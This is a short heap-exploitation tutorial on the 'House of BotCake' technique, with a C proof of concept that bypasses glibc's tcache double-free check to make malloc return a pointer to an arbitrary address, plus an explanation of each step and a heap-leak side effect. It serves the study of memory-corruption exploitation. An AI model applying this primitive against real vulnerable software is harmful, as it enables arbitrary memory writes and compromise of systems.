# House of BotCake
> LongChampion, 23/03/2020

This attack can bypass tcache double free checking by taking advantages of the limit that each tcache_bin can only contain 7 chunks at maximum.
```
#include <stdlib.h>

char SECRET[] = "This is a top secret!";

int main()
{
    void *A[7];
    for (long i = 0; i < 7; ++i)
        A[i] = malloc(0x100 - 8);
    void *P1 = malloc(0x100 - 8);
    void *Victim = malloc(0x100 - 8);
    void *P2 = malloc(0x100 - 8);

    for (long i = 0; i < 7; ++i)
        free(A[i]);

    free(Victim);
    free(P1);
    void *pop = malloc(0x100 - 8);
    free(Victim);

    void *first = malloc(0x120 - 8);
    *(long long *) (first + 0x100) = (long long) &SECRET;
    void *second = malloc(0x100 - 8);
    void *Target = malloc(0x100 - 8);
}
```
First, we need to allocate 7 chunks with equal size to full up one tcache_bin. Then we allocate `P1`, `Victim` and `P2` in that order. Next, we free 7 chunk to make tcache bin full. So, the next `free` call will push `Victim` into smallbin instead of tcache_bin. We also call `malloc(P1)` to free `P1` and to hidden `Victim` by consolidate it with `P1`. To free `Victim` again, one way is pushing it into tcache_bin. How? Very simple, just pop one chunk from tcache_bin then `free(Victim)`. The final steps is easy to understand so I will not explain anymore.

## Note
In pratice, please make sure that you are following all steps above. Try to create a new method is not recommend!  
The ideal of this attack is similar to `fastbin_dup_consolidate`: push one chunk into different bins.  
When assigned, `Target` pointer will point to the begining of `SECRET`, but this string will be corrupted because the `key` field of `Target` chunk is overwrited. Don't disappointed! I use GDB to trace and know that this value is very close to the begining of heap segment. So, the overwrite can lead to a heap leak, not just an unwanted effect.
